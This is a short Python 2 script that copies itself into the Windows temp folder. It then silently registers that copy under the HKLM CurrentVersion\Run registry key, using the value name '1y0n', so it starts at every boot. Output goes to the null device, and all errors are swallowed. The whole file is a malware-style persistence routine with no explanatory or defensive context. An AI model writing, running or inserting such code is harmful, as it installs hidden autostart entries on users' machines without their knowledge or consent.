import subprocess
import os
import tempfile

FILENAME = 'auto_run.py'
TEMPDIR = tempfile.gettempdir()

def autorun():
    try:
        print FILENAME
        os.system("copy " + FILENAME + " " + TEMPDIR)
        print 'copy ok'
    except:
        pass
    try:
        FNULL = open(os.devnull, 'w')
        subprocess.Popen("REG ADD HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
                         " /v 1y0n /d " + TEMPDIR + "\\" + FILENAME, stdout=FNULL, stderr=FNULL)
    except:
        pass

autorun()